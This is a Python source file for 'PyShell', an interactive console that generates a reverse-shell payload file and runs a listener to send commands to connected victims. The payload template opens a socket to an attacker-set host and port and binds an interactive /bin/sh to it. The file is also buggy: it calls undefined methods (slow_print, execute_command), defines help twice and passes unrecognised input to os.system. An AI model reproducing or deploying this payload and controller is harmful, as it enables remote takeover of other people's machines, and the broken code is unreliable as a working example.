#!/usr/bin/env python3
import os
import sys
import socket
import threading

class PyShell:
    def __init__(self):
        self.host = None
        self.port = None
        self.name = "default"
        self.clients = {}
        self.payload_dir = "payloads"
        self.selected_client = None

    def colored_print(self, text, color_code):
        print(f"\033[{color_code}m{text}\033[0m")

    def banner(self):
        banner = r"""
       
 /$$$$$$$             /$$$$$$  /$$                 /$$ /$$
| $$__  $$           /$$__  $$| $$                | $$| $$
| $$  \ $$ /$$   /$$| $$  \__/| $$$$$$$   /$$$$$$ | $$| $$
| $$$$$$$/| $$  | $$|  $$$$$$ | $$__  $$ /$$__  $$| $$| $$
| $$____/ | $$  | $$ \____  $$| $$  \ $$| $$$$$$$$| $$| $$
| $$      | $$  | $$ /$$  \ $$| $$  | $$| $$_____/| $$| $$
| $$      |  $$$$$$$|  $$$$$$/| $$  | $$|  $$$$$$$| $$| $$
|__/       \____  $$ \______/ |__/  |__/ \_______/|__/|__/
           /$$  | $$                                      
          |  $$$$$$/                                      
           \______/                                       

            """
        self.colored_print(banner, "92")

    def help(self):
        help_text = """
  Commands :
       set host       : Change Your Host (Ex: set host IP)
       set port       : Change Your Port (Ex: set port 4444)
       set name       : Change Your Name Session and Payload
       show options   : Show [Host,Port,Name,Target,BG]
       make           : Make Your Payload 
       run            : Start The Listener
       exit           : Exit the shell
       send           : Send command to selected client
       list           : List connected clients
       select         : Select a client for sending commands
        """
        self.colored_print(help_text, "94")

    def help(self):
        help_text = """
  Commands :
       set host       : Change Your Host (Ex: set host IP)
       set port       : Change Your Port (Ex: set port 4444)
       set name       : Change Your Name Session and Payload
       show options   : Show [Host,Port,Name,Target,BG]
       make           : Make Your Payload 
       run            : Start The Listener
       exit           : Exit the shell
        """
        self.slow_print(help_text)

    def set_host(self, host):
        self.host = host
        print(f"Host => {self.host}")

    def set_port(self, port):
        try:
            self.port = int(port)
            print(f"Port => {self.port}")
        except ValueError:
            print("Invalid port format. Please provide a valid integer.")

    def set_name(self, name):
        self.name = name
        print(f"Name => {self.name}")

    def show_options(self):
        options_info = f"\n[+] Your Host : {self.host}\n[+] Your Port : {self.port}\n[+] Session Name : {self.name}\n"
        self.slow_print(options_info)

    def make_payload(self):
        if self.host and self.port and self.name:
            try:
                os.makedirs(self.payload_dir, exist_ok=True)
                payload_file = os.path.join(self.payload_dir, f"{self.name}_payload.py")
                with open(payload_file, "w") as f:
                    payload_code = f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('{self.host}',{self.port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
                """
                    f.write(payload_code)
                self.slow_print("[+] Payload created successfully.")
            except Exception as e:
                print(f"[-] Error creating payload: {e}")
        else:
            self.slow_print("[!] Host, port, and name must be set before creating the payload.")

    def list_clients(self):
        self.colored_print("[+] Connected Clients:", "92")
        for idx, client in enumerate(self.clients.values(), start=1):
            client_ip, client_port = client.getpeername()
            client_name = client.get("name", "Unnamed")
            self.colored_print(f"{idx}. {client_name} - {client_ip}:{client_port}", "93")

    def select_client(self, user_input):
        try:
            client_idx = int(user_input.split()[-1]) - 1
            selected_client = list(self.clients.values())[client_idx]
            client_ip, client_port = selected_client.getpeername()
            self.selected_client = selected_client
            self.colored_print(f"[+] Selected client: {client_ip}:{client_port}", "92")
        except (ValueError, IndexError):
            self.colored_print("[-] Invalid client selection.", "91")

    def send_command(self, command):
        if self.selected_client:
            try:
                self.selected_client.send(command.encode())
                response = self.selected_client.recv(4096).decode()
                self.colored_print(response, "93")
            except Exception as e:
                self.colored_print(f"[-] Error sending command: {e}", "91")
        else:
            self.colored_print("[-] No client selected. Use 'list' and 'select' commands.", "91")

    def handle_client(self, client_socket):
        client_ip, client_port = client_socket.getpeername()
        client_name = client_socket.recv(1024).decode()
        self.clients[client_socket] = {"name": client_name}

        self.colored_print(f"[+] New connection from {client_ip}:{client_port} - {client_name}", "92")

        while True:
            try:
                command = client_socket.recv(4096).decode()
                if not command:
                    break
                output = self.execute_command(command)
                client_socket.send(output.encode())
            except KeyboardInterrupt:
                break
            except Exception as e:
                self.colored_print(f"[-] Error: {e}", "91")
                break

        self.colored_print(f"[-] Connection with {client_ip}:{client_port} closed.", "91")
        client_socket.close()
        del self.clients[client_socket]

    def start_listener(self):
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.bind((self.host, self.port))
            server_socket.listen(5)
            self.colored_print(f"[+] Listening on {self.host}:{self.port}", "92")
            
            while True:
                client_socket, client_address = server_socket.accept()
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
                client_thread.start()
        except KeyboardInterrupt:
            self.colored_print("\n[!] Listener interrupted.", "91")
        except Exception as e:
            self.colored_print(f"[-] Error during listener: {e}", "91")

    def start(self):
        self.banner()
        while True:
            try:
                user_input = input('[*] User@Pyshell :~ ').lower().strip()
                if user_input == "help":
                    self.help()
                elif user_input == "banner":
                    os.system("clear")
                    self.banner()
                elif "exit" in user_input:
                    self.colored_print("\nGoodbye!", "91")
                    break
                elif "set host" in user_input:
                    self.set_host(user_input.split()[-1])
                elif "set port" in user_input:
                    self.set_port(user_input.split()[-1])
                elif "set name" in user_input:
                    self.set_name(user_input.split()[-1])
                elif user_input == "show options":
                    self.show_options()
                elif user_input == "make":
                    self.make_payload()
                elif user_input == "run":
                    self.start_listener()
                elif "send" in user_input:
                    self.send_command(user_input.split("send", 1)[-1].strip())
                elif "list" in user_input:
                    self.list_clients()
                elif "select" in user_input:
                    self.select_client(user_input)
                else:
                    os.system(user_input)
            except KeyboardInterrupt:
                self.colored_print("\n[!] Keyboard interrupt detected. Use 'exit' to quit.", "91")
            except Exception as e:
                self.colored_print(f"[-] Error: {e}", "91")

if __name__ == "__main__":
    pyshell = PyShell()
    pyshell.start()
